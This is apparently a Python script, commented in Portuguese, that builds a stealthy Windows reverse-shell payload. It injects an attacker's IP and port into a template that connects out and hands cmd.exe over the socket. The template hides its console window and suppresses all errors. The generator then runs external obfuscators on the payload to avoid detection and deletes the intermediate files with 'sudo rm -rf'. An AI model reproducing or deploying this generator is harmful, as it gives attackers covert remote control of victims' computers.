#feito por M1000 - github.com/curious0w
# Bem no momento só vou focar no Windows mesmo, porque é o SO mais usado em desktops
# Então esse script vai gerar um shell reverso para Windows
import sys
import os
import subprocess
import threading 



def gerar_reverse_shell(ip_destino, porta_destino):
    os.system('clear')

  
    # O código do shell reverso com as variáveis injetadas
    shell_code = f"""
import os
import socket
import subprocess
import threading
import sys
import platform
import time # Necessário para o loop de espera

import ctypes

if platform.system() == "Windows":
    # Obtém o identificador da janela do console (se existir)
    # A função GetConsoleWindow retorna 0 se não houver console.
    janela_console = ctypes.windll.kernel32.GetConsoleWindow()
    if janela_console != 0:
        # Usa ShowWindow (SW_HIDE = 0) para esconder a janela
        ctypes.windll.user32.ShowWindow(janela_console, 0)


try:
    from subprocess import CREATE_NO_WINDOW
except ImportError:
    # Valor literal de 0x08000000 (para Python < 3.7)
    CREATE_NO_WINDOW = 134217728 

# --- CONFIGURAÇÃO ---
# IP e PORTA INJETADOS AQUI PELO SCRIPT GERADOR
ip="{ip_destino}"
port={porta_destino}

# Configuração de ocultamento de janela para o processo CMD (Windows)
startupinfo = None
if platform.system() == "Windows":
    startupinfo = subprocess.STARTUPINFO()
    # Adiciona o flag para não criar janela de console
    startupinfo.dwFlags |= CREATE_NO_WINDOW


# --- FUNÇÕES DE COMUNICAÇÃO ---

def s2p(s, p):
    # Lê do socket (s) e escreve no stdin do processo (p)
    while True:
        try:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()
            else:
                break # Conexão fechada
        except:
            break

def p2s(s, p):
    # Lê do stdout do processo (p) e envia para o socket (s)
    while True:
        try:
            # Ler byte a byte pode ser lento, mas garante que o prompt seja enviado corretamente
            s.send(p.stdout.read(1))
        except:
            break

# --- INÍCIO DA CONEXÃO E EXECUÇÃO ---

s = None
try:
    # 1. Tenta estabelecer a conexão
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # 2. Inicia o processo CMD (ou shell no Linux), usando startupinfo para ocultar
    p = subprocess.Popen(["cmd"],
                       stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT,
                       stdin=subprocess.PIPE,
                       startupinfo=startupinfo # OCULTA o CMD no Windows
                      )

    # 3. Cria e inicia as threads de comunicação
    s2p_thread = threading.Thread(target=s2p, args=[s, p])
    s2p_thread.daemon = True # Permite que a thread morra se o programa principal sair
    s2p_thread.start()

    p2s_thread = threading.Thread(target=p2s, args=[s, p])
    p2s_thread.daemon = True
    p2s_thread.start()
    
    # 4. Loop de espera para manter o processo principal vivo
    # O processo principal (o .exe) não chama p.wait(), permitindo que o console feche.
    # O loop mantém o processo principal ativo enquanto as threads de comunicação estiverem rodando.
    while s2p_thread.is_alive() and p2s_thread.is_alive():
        time.sleep(0.5)

except ConnectionRefusedError:
    # Não faz nada se a conexão for recusada
    pass
except Exception:
    # Não faz nada para falhas de socket ou outras exceções
    pass
finally:
    # 5. Garante que todos os recursos sejam fechados
    if 's' in locals() and s is not None and not s._closed:
        s.close()
    
    # Tenta terminar o processo filho se ele ainda estiver rodando
    if 'p' in locals() and p is not None and p.poll() is None:
        p.terminate()
"""
    
    # Define o nome do arquivo (será criado na raiz do projeto, junto ao menu.py)
    nome_arquivo_saida = f"payload_rev_shell_{ip_destino.replace('.', '_')}_{porta_destino}.py"
    
    try:
        
        # Salva o arquivo final
        
        
        with open(nome_arquivo_saida, 'w') as f:
            f.write(shell_code)
        
        # Confirmação da Geração (mensagem que aparece no menu.py)
        print(f"\n==================================================")
        print(f"PAYLOAD FINAL GERADO COM SUCESSO!")
        print(f"   Arquivo de Saída: {nome_arquivo_saida}")
        print(f"   Conexão configurada para: {ip_destino}:{porta_destino}")
        print(f"==================================================")
        
                # Variáveis que você já definiu:
        nome_arquivo_saida = f"payload_rev_shell_{ip_destino.replace('.', '_')}_{porta_destino}.py"
        nome_arquivo_ofuscado = "final.py" 
        python_executable = "python" # Ou 'python3' dependendo do seu ambiente

        # Corrigido: Cada argumento é um item separado na lista
        comand1 = [
            python_executable, 
            "ofuscadores/ofuscador_py.py", 
            nome_arquivo_saida, 
            "-o", 
            nome_arquivo_ofuscado, # Nome do arquivo de saída (substitui "final.py")
            "-d", 
            "-g", 
            "-p", 
            "--rename-default-parameters"
        ]




        try:
            resultado = subprocess.run(
                comand1, 
                check=True,  # Garante que um erro será levantado se o ofuscador falhar
                text=True, 
                capture_output=True
            )

            
            print("Execução bem-sucedida.")
            print("Saída Padrão:", resultado.stdout)
        

            comand2 = [
                python_executable,
                "ofuscadores/ofuscador_py2.py",
                nome_arquivo_ofuscado,
                
            ]
            



            try:
                resultado2 = subprocess.run(
                    comand2, 
                    check=True,  # Garante que um erro será levantado se o ofuscador falhar
                    text=True, 
                    capture_output=True
                )

                            
                print("Execução bem-sucedida.")
                print("Saída Padrão:", resultado2.stdout)


            except subprocess.CalledProcessError as e:
                print(f"Erro ao executar o ofuscador. Código de saída: {e.returncode}")
                print("Erro Padrão:", e.stderr)
            except FileNotFoundError:
                print("Erro: O executável 'python' ou o script 'ofuscador.py' não foi encontrado.")


            comand3 = [
                "sudo" ,
                "rm" ,
                "-rf" ,
                "final.py",
                nome_arquivo_saida
            ]


            try:
                comand3 = subprocess.run(
                    comand3, 
                    check=True,  # Garante que um erro será levantado se o ofuscador falhar
                    text=True, 
                    capture_output=True
                )

                            
                print("Execução bem-sucedida.")
                print("Saída Padrão:", comand3.stdout)


            except subprocess.CalledProcessError as e:
                print(f"Erro ao executar a remoção do arquivo temporario! Código de saída: {e.returncode}")
                print("Erro Padrão:", e.stderr)



        except subprocess.CalledProcessError as e:
            print(f"Erro ao executar o ofuscador. Código de saída: {e.returncode}")
            print("Erro Padrão:", e.stderr)
        except FileNotFoundError:
            print("Erro: O executável 'python' ou o script 'ofuscador.py' não foi encontrado.")



    except Exception as e:
        print(f"ERRO: Não foi possível escrever o arquivo final: {e}")

# --- Execução Principal do escopo_win.py ---



if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Erro: Faltando argumentos IP e PORTA.")
        sys.exit(1)

    ip_final = sys.argv[1]
    porta_final = sys.argv[2] 

    # Chama a função principal para criar o arquivo
    
    gerar_reverse_shell(ip_final, porta_final)
    
